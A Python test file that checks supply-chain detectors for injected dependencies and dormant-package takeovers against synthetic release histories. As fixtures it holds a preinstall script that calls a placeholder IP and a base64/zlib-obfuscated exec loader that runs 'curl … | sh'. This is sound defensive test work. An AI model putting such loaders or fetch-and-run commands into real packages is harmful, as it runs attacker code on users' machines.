"""dependency_injection and revival_takeover on synthetic histories (inert text, offline).

Time: every signal is relative to as_of = the upload time of the latest release, so these histories use dates in
2018-2019 and must give the same result whatever today's date is."""
import http_cache
import releases as R
from detectors import dependency_injection, revival_takeover, run_detectors
from detectors.context import DetectorContext
from fragility import compute_fragility
from release_helpers import history, npm_release, pypi_release

T_OLD, T_NEW = "2018-09-01T00:00:00Z", "2018-09-16T00:00:00Z"
NET_JS = "const https = require('https');\nhttps.get('https://198.51.100.7/p', () => {});\n"


def prof(name, age=400, look=None, hook=None, osv=None, status="ok", eco="npm", dependents=None):
    return {"name": name, "ecosystem": eco, "status": status, "reason": "not on the registry now" if status == "not_found" else None,
            "first_release": None, "age_days": age, "version_at_as_of": "0.1.1", "install_hook": hook or {},
            "install_hook_source": "npm registry scripts", "osv_mal": osv or [], "osv_status": "ran",
            "dependents": dependents, "dependents_status": "deps.dev (current count)" if dependents is not None else "not available",
            "lookalike_of": look}


def dep_ctx(*profiles, added=None):
    rc = history([npm_release("3.3.6", T_NEW, deps={"flatmap-stream": "0.1.1"}), npm_release("3.3.5", T_OLD)])
    names = added or [p["name"] for p in profiles]
    rc["dependencies"] = {"status": "ok", "reason": None, "new_version": "3.3.6", "old_version": "3.3.5", "as_of": T_NEW,
                          "added": names, "removed": [], "profiles": list(profiles), "not_looked_up": []}
    return rc


def run(det, rc, **kw):
    return det.detect(DetectorContext.build(releases=rc, **kw))


def tiers(r):
    return [f["tier"] for f in r["findings"]]


# ------------------------------------------------------------------ dependency_injection

def test_young_lookalike_dependency_is_high_risk():
    r = run(dependency_injection, dep_ctx(prof("lodahs", age=5, look="lodash")))
    assert tiers(r) == ["high_risk"]
    ev = next(e for e in r["findings"][0]["evidence"] if e.get("dependency"))
    assert ev["age_days_at_release"] == 5 and ev["lookalike_of"] == "lodash"


def test_young_dependency_with_install_hook_is_high_risk():
    r = run(dependency_injection, dep_ctx(prof("flatmap-stream", age=12, hook={"postinstall": "node x.js"})))
    assert tiers(r) == ["high_risk"] and "install hook" in r["findings"][0]["rule"]


def test_young_dependency_alone_is_review():
    r = run(dependency_injection, dep_ctx(prof("flatmap-stream", age=12, dependents=0)))
    assert tiers(r) == ["review"]
    assert "0 dependents on deps.dev" in r["findings"][0]["detail"]


def test_young_dependency_with_benign_build_hook_is_only_review():
    r = run(dependency_injection, dep_ctx(prof("fast-native", age=3, hook={"install": "node-gyp rebuild"})))
    assert tiers(r) == ["review"]


def test_lookalike_alone_is_review_and_established_dependency_is_nothing():
    assert tiers(run(dependency_injection, dep_ctx(prof("requets", age=900, look="requests")))) == ["review"]
    assert run(dependency_injection, dep_ctx(prof("chalk", age=3000)))["findings"] == []


def test_dependency_with_osv_mal_is_known_malicious_and_caps_the_headline():
    from security import apply_gate
    rc = dep_ctx(prof("flatmap-stream", age=12, osv=["MAL-2018-1"]))
    r = run(dependency_injection, rc)
    assert tiers(r) == ["known_malicious"] and r["findings"][0]["strong"]
    sec = {"level": "No unpatched issues found", "findings": [], "coverage": [], "package": rc["package"]}
    g = apply_gate({"score": 95.0, "label": "Healthy", "factors": [], "notes": []}, sec, [], None, releases=rc)
    assert g["trust_score"] <= 15 and g["trust_label_base"] == "DO NOT USE: known malicious indicator"


def test_removed_dependency_is_review():
    assert tiers(run(dependency_injection, dep_ctx(prof("ghost-pkg", age=None, status="not_found")))) == ["review"]


def test_dependency_statuses_and_partial():
    rc = dep_ctx()
    rc["dependencies"] = {"status": "not_assessed", "reason": "declared dependencies not available for both releases"}
    assert run(dependency_injection, rc)["status"] == "not_assessed"
    rc2 = dep_ctx(prof("x", age=900), added=["x"] + [f"d{i}" for i in range(12)])
    rc2["dependencies"]["not_looked_up"] = ["d10", "d11"]
    r2 = run(dependency_injection, rc2)
    assert r2["coverage"] == "partial" and "not looked up" in r2["coverage_detail"]


def test_dependency_profile_age_is_relative_to_the_release_not_today(monkeypatch):
    pack = {"time": {"created": "2018-09-04T00:00:00Z", "0.1.0": "2018-09-04T00:00:00Z", "0.1.1": "2018-09-09T00:00:00Z",
                     "0.2.0": "2019-05-01T00:00:00Z"},
            "versions": {"0.1.0": {}, "0.1.1": {"scripts": {"postinstall": "node x.js"}}, "0.2.0": {}}}
    monkeypatch.setattr(http_cache, "get_json", lambda url, headers=None, timeout=None: (pack, 200, None))
    p = R.dependency_profile("npm", "flatmap-stream", R._dt(T_NEW))
    assert p["age_days"] == 12 and p["version_at_as_of"] == "0.1.1" and p["install_hook"] == {"postinstall": "node x.js"}


def test_dependency_profile_not_found(monkeypatch):
    monkeypatch.setattr(http_cache, "get_json", lambda url, headers=None, timeout=None: (None, 404, None))
    assert R.dependency_profile("PyPI", "gone", R._dt(T_NEW))["status"] == "not_found"


def test_fetch_dependency_changes_added_and_removed(monkeypatch):
    monkeypatch.setattr(R, "dependency_profile", lambda eco, name, as_of, download=True: prof(name))
    monkeypatch.setattr(R, "_dep_external", lambda eco, name, v: {"osv_mal": [], "osv_status": "ran"})
    new = npm_release("2.0.0", T_NEW, deps={"a": "1", "b": "1"}); old = npm_release("1.0.0", T_OLD, deps={"a": "1", "c": "1"})
    d = R.fetch_dependency_changes(history([new, old])["history"])
    assert d["added"] == ["b"] and d["removed"] == ["c"] and [p["name"] for p in d["profiles"]] == ["b"]


# ------------------------------------------------------------------ revival_takeover

def revival_rels(new_pub="mallory", gap_days=400, **new_kw):
    from datetime import datetime, timedelta
    t_new = datetime(2019, 6, 1)
    return [npm_release("2.0.0", (t_new).isoformat() + "Z", publisher=new_pub, **new_kw),
            npm_release("1.9.0", (t_new - timedelta(days=gap_days)).isoformat() + "Z", publisher="alice"),
            npm_release("1.8.0", (t_new - timedelta(days=gap_days + 60)).isoformat() + "Z", publisher="alice")]


def test_revival_alone_is_review_and_not_escalated_by_fragility():
    fr = compute_fragility(5, {"bus_factor": 1, "silent_departure": True, "burnout_status": "x"}, {"days_since_last_commit": 900})
    out = run_detectors(DetectorContext.build(releases=history(revival_rels()), fragility=fr), registry=[revival_takeover])[0]
    f = out["findings"][0]
    assert out["tier"] == "review" and not out["fragility_amplified"] and f["no_fragility_escalation"]
    assert "no release for 400 days" in f["detail"] and "new publisher mallory" in f["detail"]
    assert "genuine maintainer handover" in f["detail"] and "Fragility index" in f["detail"]


def test_revival_with_new_install_capability_is_high_risk():
    rels = revival_rels(scripts={"preinstall": "node p.js"}, files={"p.js": NET_JS})
    r = run(revival_takeover, history(rels))
    assert tiers(r) == ["high_risk"] and "new install hook" in r["findings"][0]["detail"]


def test_silence_without_new_actor_is_not_flagged():
    assert run(revival_takeover, history(revival_rels(new_pub="alice")))["findings"] == []


def test_new_actor_without_silence_is_not_flagged():
    assert run(revival_takeover, history(revival_rels(gap_days=40)))["findings"] == []


def test_git_revival_with_new_commit_author_and_decoded_payload():
    import base64, zlib
    enc = base64.b64encode(zlib.compress(b'import os; os.system("curl http://198.51.100.4/x | sh")')).decode()
    rels = revival_rels(new_pub="alice", gap_days=30, files={"lib/l.py": f"import base64, zlib\nexec(zlib.decompress(base64.b64decode('{enc}')).decode())\n"})
    rc = history(rels)
    rc["activity"] = {"status": "ok", "complete": True, "commits": [
        {"date": "2019-05-20T00:00:00Z", "author": "mallory"}, {"date": "2019-05-10T00:00:00Z", "author": "mallory"},
        {"date": "2017-11-01T00:00:00Z", "author": "alice"}, {"date": "2017-10-01T00:00:00Z", "author": "alice"}]}
    r = run(revival_takeover, rc)
    assert tiers(r) == ["high_risk"]
    d = r["findings"][0]["detail"]
    assert "no commits for 555 days" in d and "new commit author(s) after the silence: mallory" in d and "decoded payload" in d


def test_rename_indicator_counts_as_activity():
    rc = history(revival_rels(new_pub="alice"))
    rc["git"] = {"status": "ok", "full_name": "someone-else/demo"}; rc["requested_repo"] = "alice/demo"
    r = run(revival_takeover, rc)
    assert tiers(r) == ["review"] and "renamed or transferred" in r["findings"][0]["detail"]


def test_git_not_assessed_is_partial_coverage():
    rc = history(revival_rels(new_pub="alice"))
    rc["activity"] = {"status": "not_assessed", "reason": "GitHub repository lookup failed (HTTP 403)", "commits": []}
    r = run(revival_takeover, rc)
    assert r["coverage"] == "partial" and "registry signals only" in r["coverage_detail"]


def test_git_revival_window_is_relative_to_release_time():
    from datetime import datetime, timezone
    commits = [{"date": "2019-05-20T00:00:00Z", "author": "b"}, {"date": "2017-01-01T00:00:00Z", "author": "a"}]
    as_of = datetime(2019, 6, 1, tzinfo=timezone.utc)
    rev = revival_takeover.git_revival(commits, as_of)
    assert rev and rev["gap_days"] == 869 and rev["authors_before"] == ["a"] and rev["authors_after"] == ["b"]
    assert revival_takeover.git_revival(commits, datetime(2021, 6, 1, tzinfo=timezone.utc)) is None   # revival too long before as_of
